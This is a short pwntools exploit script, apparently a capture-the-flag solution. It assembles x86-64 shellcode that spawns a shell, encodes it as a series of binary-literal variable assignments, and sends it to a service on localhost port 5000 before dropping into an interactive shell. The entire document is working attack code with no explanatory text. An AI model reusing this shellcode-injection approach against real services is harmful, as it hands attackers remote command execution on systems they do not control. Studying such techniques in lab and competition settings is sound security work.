from pwn import *

context.arch = 'x86-64'

sc = asm(shellcraft.sh())
sol = ''.join(f'b{x//4*'b'}={bin(u32(sc[x:x+4]))};' for x in range(0, len(sc), 4))
print(sol)

p = remote('localhost', '5000')
p.sendline(sol.encode())
p.sendline(b'b')
p.interactive()
